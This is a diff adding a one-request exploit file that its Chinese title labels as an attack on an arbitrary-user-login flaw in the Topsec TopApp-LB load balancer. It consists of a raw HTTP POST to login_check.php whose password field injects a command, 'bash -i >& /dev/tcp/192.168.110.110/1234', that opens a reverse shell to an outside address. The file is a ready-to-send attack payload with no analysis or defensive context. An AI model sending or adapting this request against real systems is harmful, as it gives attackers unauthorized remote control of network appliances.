@@ -1,0 +1,11 @@
+# 利用【天融信负载均衡TopApp-LB系统任意用户登录漏洞】-30000309
+# 天融信负载均衡TopApp-LB系统任意用户登录
+POST /login_check.php?acid=30000309&bid=hd_tag_m8mv25ti HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25ti
+RM-PRO-Token: 2929f4984f5a2f82f82043e1b8fcec9e
+RM-PRO-Time: 1742808506376
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+userName=admin&password=;bash+-i+>%26+/dev/tcp/192.168.110.110/1234+0>%261&x=34&y=13
